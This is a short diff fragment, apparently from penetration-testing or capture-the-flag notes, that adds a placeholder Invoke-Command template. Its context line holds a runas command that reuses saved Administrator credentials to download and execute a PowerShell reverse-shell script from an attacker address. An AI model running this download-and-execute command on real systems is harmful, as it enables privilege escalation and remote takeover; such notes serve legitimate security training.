@@ -306,4 +306,8 @@ Message: WinR3d@
 runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object net.webclient).downloadstring('http://10.10.14.6/Invoke-PowerShellTcp.ps1')"
 ```
 
+```
+Invoke-Command -ScriptBlock <COMMAND> -ComputerName <COMPUTER> -credential <USERNAME>
+```
+
 
